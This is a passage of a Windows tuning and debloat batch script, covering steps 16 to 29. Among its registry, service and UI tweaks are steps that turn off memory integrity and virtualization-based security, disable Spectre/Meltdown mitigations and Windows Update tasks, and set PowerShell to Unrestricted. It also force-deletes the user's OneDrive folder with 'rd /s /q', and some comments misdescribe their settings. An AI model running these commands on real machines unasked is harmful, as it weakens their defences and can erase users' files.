REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "EnableDynamicContentInWSB" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SearchCompanion" /v "DisableContentFileUpdates" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: OneDrive Sync Service
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
:: Background Apps
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: P2P / Peernet
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Peernet" /v "Disabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Additional Privacy and Service Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Additional Privacy and Service Tweaks
    set /a FAIL+=1
    echo Additional Privacy and Service Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 17 - Custom Visual Effects
:: ================================================
echo [STEP 17/32] Applying Custom Visual Effects...
set STEP_ERR=0
:: Disable transparency
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Use Custom visual effects mode
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
:: Show window contents while dragging
reg add "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Smooth edges of screen fonts
reg add "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d 2 /f >nul 2>&1 || set STEP_ERR=1
:: Enable translucent selection rectangle
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Show thumbnails instead of icons
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable taskbar animations
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable menu show delay
reg add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable window minimize/maximize animations
reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable mouse shadow
reg add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d 9012038010000000 /f >nul 2>&1 || set STEP_ERR=1
:: Disable enhance pointer precision (mouse acceleration)
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
:: Restart Explorer to apply visual changes
echo  Restarting Explorer to apply visual changes...
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe
if !STEP_ERR!==0 (
    echo  [OK] Custom Visual Effects
    set /a PASS+=1
) else (
    echo  [FAIL] Custom Visual Effects
    set /a FAIL+=1
    echo Custom Visual Effects>> "!_FAILS!"
)


:: ================================================
:: STEP 18 - PowerShell Execution Policy
:: ================================================
echo [STEP 18/32] Setting PowerShell Execution Policy...
set STEP_ERR=0
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force" >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] PowerShell Execution Policy
    set /a PASS+=1
) else (
    echo  [FAIL] PowerShell Execution Policy
    set /a FAIL+=1
    echo PowerShell Execution Policy>> "!_FAILS!"
)

:: ================================================
:: STEP 19 - Core Isolation and Memory Integrity
:: ================================================
echo [STEP 19/32] Disabling Core Isolation and Memory Integrity...
set STEP_ERR=0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
bcdedit /set hypervisorlaunchtype off >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Core Isolation and Memory Integrity
    set /a PASS+=1
) else (
    echo  [FAIL] Core Isolation and Memory Integrity
    set /a FAIL+=1
    echo Core Isolation and Memory Integrity>> "!_FAILS!"
)

:: ================================================
:: STEP 20 - Spectre and Meltdown Mitigations
:: ================================================
echo [STEP 20/32] Disabling Spectre and Meltdown Mitigations...
set STEP_ERR=0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Spectre and Meltdown Mitigations
    set /a PASS+=1
) else (
    echo  [FAIL] Spectre and Meltdown Mitigations
    set /a FAIL+=1
    echo Spectre and Meltdown Mitigations>> "!_FAILS!"
)

:: ================================================
:: STEP 21 - Disable Unnecessary Services
:: ================================================
echo [STEP 21/32] Disabling Unnecessary Services...
set STEP_ERR=0
:: Background Intelligent Transfer Service
sc config BITS start= disabled >nul 2>&1 & sc stop BITS >nul 2>&1
:: Connected User Experiences and Telemetry
sc config DiagTrack start= disabled >nul 2>&1 & sc stop DiagTrack >nul 2>&1
:: Data Usage
sc config DusmSvc start= disabled >nul 2>&1 & sc stop DusmSvc >nul 2>&1
:: Diagnostic Policy Service
sc config DPS start= disabled >nul 2>&1 & sc stop DPS >nul 2>&1
:: Distributed Link Tracking Client
sc config TrkWks start= disabled >nul 2>&1 & sc stop TrkWks >nul 2>&1
:: Downloaded Maps Manager
sc config MapsBroker start= disabled >nul 2>&1 & sc stop MapsBroker >nul 2>&1
:: Game Bar and DVR
sc config BcastDVRUserService start= disabled >nul 2>&1 & sc stop BcastDVRUserService >nul 2>&1
:: Geolocation Service
sc config lfsvc start= disabled >nul 2>&1 & sc stop lfsvc >nul 2>&1
:: Hyper-V related services
for %%H in (HvHost vmickvpexchange vmicguestinterface vmicshutdown vmictimesync vmicvmsession vmicrdv vmicvss vmicheartbeat) do (
    sc config %%H start= disabled >nul 2>&1
    sc stop %%H >nul 2>&1
)
:: IP Helper
sc config iphlpsvc start= disabled >nul 2>&1 & sc stop iphlpsvc >nul 2>&1
:: Parental Controls
sc config WpcMonSvc start= disabled >nul 2>&1 & sc stop WpcMonSvc >nul 2>&1
:: Print Spooler
sc config Spooler start= disabled >nul 2>&1 & sc stop Spooler >nul 2>&1
:: Quality Windows Audio Video Experience
sc config QWAVE start= disabled >nul 2>&1 & sc stop QWAVE >nul 2>&1
:: Remote Registry
sc config RemoteRegistry start= disabled >nul 2>&1 & sc stop RemoteRegistry >nul 2>&1
:: Retail Demo Service
sc config RetailDemo start= disabled >nul 2>&1 & sc stop RetailDemo >nul 2>&1
:: Sync Host / OneDrive Sync
sc config OneSyncSvc start= disabled >nul 2>&1 & sc stop OneSyncSvc >nul 2>&1
:: Sysmain
sc config SysMain start= disabled >nul 2>&1 & sc stop SysMain >nul 2>&1
:: TCP/IP NetBIOS Helper
sc config lmhosts start= disabled >nul 2>&1 & sc stop lmhosts >nul 2>&1
:: Telephony
sc config TapiSrv start= disabled >nul 2>&1 & sc stop TapiSrv >nul 2>&1
:: Themes
sc config Themes start= disabled >nul 2>&1 & sc stop Themes >nul 2>&1
:: Windows Search
sc config WSearch start= disabled >nul 2>&1 & sc stop WSearch >nul 2>&1
sc config GameInputSvc start= disabled >nul 2>&1 & sc stop GameInputSvc >nul 2>&1
:: Windows Error Reporting
sc config WerSvc start= disabled >nul 2>&1 & sc stop WerSvc >nul 2>&1
:: Fax
sc config Fax start= disabled >nul 2>&1 & sc stop Fax >nul 2>&1
:: WAP Push / Device Management
sc config dmwappushservice start= disabled >nul 2>&1 & sc stop dmwappushservice >nul 2>&1
:: Secondary Logon
sc config seclogon start= disabled >nul 2>&1 & sc stop seclogon >nul 2>&1
:: Touch Keyboard and Handwriting Panel
sc config TabletInputService start= disabled >nul 2>&1 & sc stop TabletInputService >nul 2>&1
:: Mixed Reality OpenXR
sc config MixedRealityOpenXRSvc start= disabled >nul 2>&1 & sc stop MixedRealityOpenXRSvc >nul 2>&1
:: Smart Card
sc config SCardSvr start= disabled >nul 2>&1 & sc stop SCardSvr >nul 2>&1
sc config ScDeviceEnum start= disabled >nul 2>&1 & sc stop ScDeviceEnum >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Disable Unnecessary Services
    set /a PASS+=1
) else (
    echo  [FAIL] Disable Unnecessary Services
    set /a FAIL+=1
    echo Disable Unnecessary Services>> "!_FAILS!"
)


:: ================================================
:: STEP 22 - Scheduled Tasks Cleanup
:: ================================================
echo [STEP 22/32] Disabling Telemetry and Bloat Scheduled Tasks...
set STEP_ERR=0
for %%T in (
    "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
    "Microsoft\Windows\Application Experience\ProgramDataUpdater"
    "Microsoft\Windows\Application Experience\StartupAppTask"
    "Microsoft\Windows\Autochk\Proxy"
    "Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
    "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
    "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"
    "Microsoft\Windows\Defrag\ScheduledDefrag"
    "Microsoft\Windows\Device Information\Device"
    "Microsoft\Windows\Diagnosis\Scheduled"
    "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"
    "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver"
    "Microsoft\Windows\DiskFootprint\Diagnostics"
    "Microsoft\Windows\Feedback\Siuf\DmClient"
    "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload"
    "Microsoft\Windows\Input\LocalUserSyncDataAvailable"
    "Microsoft\Windows\Input\MouseSyncDataAvailable"
    "Microsoft\Windows\Input\PenSyncDataAvailable"
    "Microsoft\Windows\Input\TouchpadSyncDataAvailable"
    "Microsoft\Windows\Location\Notifications"
    "Microsoft\Windows\Location\WindowsActionDialog"
    "Microsoft\Windows\Maintenance\WinSAT"
    "Microsoft\Windows\Maps\MapsToastTask"
    "Microsoft\Windows\Maps\MapsUpdateTask"
    "Microsoft\Windows\NetTrace\GatherNetworkInfo"
    "Microsoft\Windows\PI\Sqm-Tasks"
    "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"
    "Microsoft\Windows\Shell\FamilySafetyMonitor"
    "Microsoft\Windows\Shell\FamilySafetyRefreshTask"
    "Microsoft\Windows\Speech\SpeechModelDownloadTask"
    "Microsoft\Windows\UpdateOrchestrator\Schedule Scan"
    "Microsoft\Windows\WDI\ResolutionHost"
    "Microsoft\Windows\Windows Error Reporting\QueueReporting"
    "Microsoft\Windows\WindowsUpdate\Automatic App Update"
    "Microsoft\Windows\WindowsUpdate\Scheduled Start"
    "Microsoft\XblGameSave\XblGameSaveTask"
) do (
    schtasks /change /tn %%T /disable >nul 2>&1
)
:: Disable automatic maintenance
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Scheduled Tasks Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] Scheduled Tasks Cleanup
    set /a FAIL+=1
    echo Scheduled Tasks Cleanup>> "!_FAILS!"
)

:: ================================================
:: STEP 23 - Disk and File System Tweaks
:: ================================================
echo [STEP 23/32] Applying Disk and File System Tweaks...
set STEP_ERR=0
:: Disable NTFS last access timestamp (reduces I/O on every file read/write)
fsutil behavior set disablelastaccess 1 >nul 2>&1 || set STEP_ERR=1
:: Disable 8.3 filename creation (reduces NTFS overhead on large directories)
fsutil behavior set disable8dot3 1 >nul 2>&1 || set STEP_ERR=1
:: Disable memory-mapped I/O for NTFS (reduces paging)
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMemoryUsage" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Storage Sense (stops Windows from auto-deleting files in the background)
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\StorageSense\Parameters\StoragePolicy" /v "01" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\StorageSense" /v "AllowStorageSenseGlobal" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable hibernation completely and remove hiberfil.sys (frees RAM-sized disk space)
powercfg /h off >nul 2>&1 || set STEP_ERR=1
:: Pagefile: detect RAM and set fixed size (no dynamic resize overhead during gaming)
:: <8GB RAM = 8192MB  |  8-16GB = 4096MB  |  >16GB = 2048MB
powershell -NoProfile -Command "$r=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB);$p=if($r-lt 8){8192}elseif($r-le 16){4096}else{2048};$c=Get-WmiObject Win32_ComputerSystem -EnableAllPrivileges;$c.AutomaticManagedPagefile=$false;$c.Put()|Out-Null;$pfs=Get-WmiObject Win32_PageFileSetting;if($pfs){$pfs|%%{$_.InitialSize=$p;$_.MaximumSize=$p;$_.Put()|Out-Null}}else{Set-WmiInstance -Class Win32_PageFileSetting -Arguments @{Name='C:\pagefile.sys';InitialSize=$p;MaximumSize=$p}|Out-Null}" >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Disk and File System Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Disk and File System Tweaks
    set /a FAIL+=1
    echo Disk and File System Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 24 - UI and Taskbar Cleanup
:: ================================================
echo [STEP 24/32] Applying UI and Taskbar Cleanup...
set STEP_ERR=0
:: Disable Widgets / News and Interests on taskbar
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarDa" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Chat / Teams icon on taskbar
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarMn" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Chat" /v "ChatIcon" /t REG_DWORD /d 3 /f >nul 2>&1
:: Disable Start Menu recommendations and suggested content
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "HideRecommendedSection" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable lock screen ads and Spotlight
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
:: Remove OneDrive from File Explorer sidebar
REG ADD "HKCU\Software\Classes\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Sticky Keys / Toggle Keys / Filter Keys shortcut (no more Shift x5 popup in games)
REG ADD "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "506" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "58" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "122" /f >nul 2>&1 || set STEP_ERR=1
:: Disable "Get the most out of Windows" and welcome experience suggestions
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Bing search in Start Menu
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] UI and Taskbar Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] UI and Taskbar Cleanup
    set /a FAIL+=1
    echo UI and Taskbar Cleanup>> "!_FAILS!"
)

:: ================================================
:: STEP 25 - Audio Tweaks
:: ================================================
echo [STEP 25/32] Applying Audio Tweaks...
set STEP_ERR=0
:: Disable audio enhancements on all render devices
powershell -NoProfile -Command "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render' -ErrorAction SilentlyContinue | ForEach-Object { $p=Join-Path $_.PSPath 'Properties'; if(Test-Path $p){ try{ New-ItemProperty -Path $p -Name '{1da5d803-d492-4edd-8c23-e0c0ffee7f0e},5' -Value 1 -PropertyType DWord -Force -EA SilentlyContinue|Out-Null }catch{} } }" >nul 2>&1 || set STEP_ERR=1
:: MMCSS audio task priorities (lower audio scheduling latency)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "False" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d 10000 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d 8 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d 6 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Audio Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Audio Tweaks
    set /a FAIL+=1
    echo Audio Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 26 - NVIDIA and AMD GPU Cleanup
:: ================================================
echo [STEP 26/32] Applying NVIDIA and AMD GPU Cleanup...
set STEP_ERR=0
:: Disable NVIDIA telemetry service
sc config NvTelemetryContainer start= disabled >nul 2>&1 & sc stop NvTelemetryContainer >nul 2>&1
:: Disable NVIDIA ULPS (Ultra Low Power State) - prevents GPU from idling between frames
powershell -NoProfile -Command "Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}' -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '\\\d{4}$'} | ForEach-Object { Set-ItemProperty -Path $_.PSPath -Name 'EnableUlps' -Value 0 -Type DWord -Force -EA SilentlyContinue; Set-ItemProperty -Path $_.PSPath -Name 'EnableUlps_NA' -Value 0 -Type DWord -Force -EA SilentlyContinue }" >nul 2>&1
:: Disable AMD Crash Defender and telemetry (no-op on NVIDIA systems)
sc config "AMD Crash Defender" start= disabled >nul 2>&1 & sc stop "AMD Crash Defender" >nul 2>&1
sc config "AMD External Events Utility" start= disabled >nul 2>&1 & sc stop "AMD External Events Utility" >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] NVIDIA and AMD GPU Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] NVIDIA and AMD GPU Cleanup
    set /a FAIL+=1
    echo NVIDIA and AMD GPU Cleanup>> "!_FAILS!"
)


:: ================================================
:: STEP 27 - Microsoft Edge Complete Removal
:: ================================================
echo [STEP 27/32] Removing Microsoft Edge...
set STEP_ERR=0
:: Kill Edge processes
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im MicrosoftEdgeUpdate.exe >nul 2>&1
:: Remove Edge folders
rd /s /q "%LOCALAPPDATA%\Microsoft\Edge" >nul 2>&1
rd /s /q "%ProgramFiles(x86)%\Microsoft\Edge" >nul 2>&1
rd /s /q "%ProgramFiles(x86)%\Microsoft\EdgeCore" >nul 2>&1
rd /s /q "%ProgramFiles(x86)%\Microsoft\EdgeUpdate" >nul 2>&1
:: Remove Edge shortcuts
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk" >nul 2>&1
del /f /q "%PUBLIC%\Desktop\Microsoft Edge.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\Microsoft Edge.lnk" >nul 2>&1
:: Remove Edge registry entries
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Microsoft\Edge" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\WOW6432Node\Microsoft\Edge" /f >nul 2>&1
REG DELETE "HKCU\Software\Microsoft\Edge" /f >nul 2>&1
:: Block Edge from being reinstalled via policy (stable and beta channels)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\EdgeUpdate" /v "Install{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\EdgeUpdate" /v "Install{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" /t REG_DWORD /d 0 /f >nul 2>&1
:: Create dummy folders so Windows cannot use those paths to reinstall Edge
md "%ProgramFiles(x86)%\Microsoft\Edge" >nul 2>&1
md "%ProgramFiles(x86)%\Microsoft\Edge\Application" >nul 2>&1
:: Lock the dummy folders so Windows Update cannot write to them
icacls "%ProgramFiles(x86)%\Microsoft\Edge" /deny *S-1-1-0:(OI)(CI)(W,D,DA) >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Microsoft Edge Removed
    set /a PASS+=1
) else (
    echo  [FAIL] Microsoft Edge Removal
    set /a FAIL+=1
    echo Microsoft Edge Removal>> "!_FAILS!"
)

:: ================================================
:: STEP 28 - OneDrive Complete Uninstall
:: ================================================
echo [STEP 28/32] Removing OneDrive...
set STEP_ERR=0
:: Kill OneDrive
taskkill /f /im OneDrive.exe >nul 2>&1
:: Run official Microsoft uninstallers
"%SYSTEMROOT%\SysWOW64\OneDriveSetup.exe" /uninstall >nul 2>&1
"%SYSTEMROOT%\System32\OneDriveSetup.exe" /uninstall >nul 2>&1
:: Remove OneDrive data folders
rd /s /q "%USERPROFILE%\OneDrive" >nul 2>&1
rd /s /q "%LOCALAPPDATA%\Microsoft\OneDrive" >nul 2>&1
rd /s /q "%ProgramData%\Microsoft\OneDrive" >nul 2>&1
rd /s /q "%SystemDrive%\OneDriveTemp" >nul 2>&1
:: Remove OneDrive shortcuts
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk" >nul 2>&1
del /f /q "%PUBLIC%\Desktop\OneDrive.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\OneDrive.lnk" >nul 2>&1
:: Remove OneDrive from startup and registry
REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /f >nul 2>&1
:: Block OneDrive from reinstalling
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableLibrariesDefaultSaveToOneDrive" /t REG_DWORD /d 1 /f >nul 2>&1
:: Restart Explorer to clean up sidebar
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe
if !STEP_ERR!==0 (
    echo  [OK] OneDrive Removed
    set /a PASS+=1
) else (
    echo  [FAIL] OneDrive Removal
    set /a FAIL+=1
    echo OneDrive Removal>> "!_FAILS!"
)

:: ================================================
:: STEP 29 - Microsoft Store Bloatware Removal
:: ================================================
echo [STEP 29/32] Removing Microsoft Store Bloatware...
set STEP_ERR=0
set "_BLOAT=!_FAILS:opt_fails=remove_bloat!"
set "_BLOATPS=%TEMP%\remove_bloat_%RANDOM%.ps1"
(
    echo $apps = @^(
    echo     "*Clipchamp.Clipchamp*","*Microsoft.3DBuilder*","*Microsoft.549981C3F5F10*",
    echo     "*Microsoft.BingFinance*","*Microsoft.BingNews*","*Microsoft.BingSports*",
    echo     "*Microsoft.BingTranslator*","*Microsoft.BingWeather*","*Microsoft.Copilot*",
    echo     "*Microsoft.Getstarted*","*Microsoft.Messaging*","*Microsoft.Microsoft3DViewer*",
    echo     "*Microsoft.MicrosoftJournal*","*Microsoft.MicrosoftOfficeHub*",
    echo     "*Microsoft.MicrosoftSolitaireCollection*","*Microsoft.MicrosoftStickyNotes*",
    echo     "*Microsoft.MixedReality.Portal*","*Microsoft.NetworkSpeedTest*","*Microsoft.News*",
    echo     "*Microsoft.Office.OneNote*","*Microsoft.Office.Sway*","*Microsoft.OneConnect*",
    echo     "*Microsoft.Print3D*","*Microsoft.PowerAutomateDesktop*","*Microsoft.SkypeApp*",
